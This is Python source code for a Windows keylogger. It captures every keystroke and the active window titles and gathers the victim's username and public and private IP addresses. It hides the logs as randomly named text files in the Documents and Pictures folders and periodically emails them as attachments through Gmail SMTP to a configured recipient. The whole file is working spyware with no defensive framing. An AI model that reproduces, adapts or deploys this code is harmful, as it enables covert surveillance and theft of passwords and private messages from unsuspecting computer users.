from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import win32gui
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

print(privateIP)
print(user)

msg = f'[START OF LOGS] \n *~Date/Time: {datetime}\n *~User-Profile: {user}\n *~Public-IP: {publicIP}\n *~Private_IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

# Set the maximum size of logged data in bytes (2KB)
MAX_LOG_SIZE_BYTES = 2048

def on_press(key):
    global logged_data  # Declare logged_data as global

    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    print("Current window title:", new_app)  # Print the current window title

    if new_app == 'Cortana':
        new_app = "Window start menu"
    else:
        pass

    substitution = {'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ', 'Key.alt_l': '[ALT]', 
                    'Key.tab': '[TAB]', 'Key.delete': '[DEL]', 'Key.ctrl_l': '[CTRL]', 'Key.left': '[LEFT ARROW]', 
                    'Key.right': '[RIGHT ARROW]', 'Key.shift': '[SHIFT]', '\\x13': '[CTRL-S]', '\\x17': '[CTRL-w]', 
                    'key.caps_lock': '[CAPS LK]', '\\x01': '[CTRL-A]', 'Key.cmd': '[WINDOWS KEY]', 
                    'key.print_screen': '[PRNT SCR]', '\\x03': '[CTRL-C]', '\\16': '[CTRL-V]'}

    key = str(key).strip('\'')
    if key in substitution:
        logged_data.append(substitution[key])
    else:
        logged_data.append(key)


def write_file(count):
    one = os.path.expanduser('~') + '/Documents/'
    two = os.path.expanduser('~') + '/Pictures/'

    paths = [one, two]

    filepath = random.choice(paths)
    filename = str(count) + 'I' + str(random.randint(999999, 1000000)) + '.txt'

    file = filepath + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))

def send_logs():
    global logged_data, delete_file, user

    fromaddr = 'your_email_id@gmail.com'  # Your email address
    toaddr = 'Recipient_email_address@gmail.com'  # Recipient email address
    password = 'Your email password'  # Your email password

    subject = f'[{user}]'
    body = 'Log files attached.'

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    # Attach log files
    for file_path in delete_file:
        attachment = open(file_path, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file_path)}')
        msg.attach(part)

    # Connect to SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)

    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)

    server.quit()

count = 0
logged_data_size = 0  # Initialize the size of logged data

def on_release(key):
    global count, logged_data, logged_data_size  # Declare global variables

    count += 1
    logged_data.append('\n')

    # Calculate the size of logged data in bytes
    logged_data_size = len('\n'.join(logged_data))

    # Send logs if the size exceeds the threshold
    if logged_data_size >= MAX_LOG_SIZE_BYTES:
        write_file(count)
        send_logs()
        count = 0
        logged_data.clear()  # Reset logged_data
        logged_data_size = 0  # Reset logged_data_size

    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    t1 = threading.Thread(target=send_logs)
    t1.start()
    listener.join()
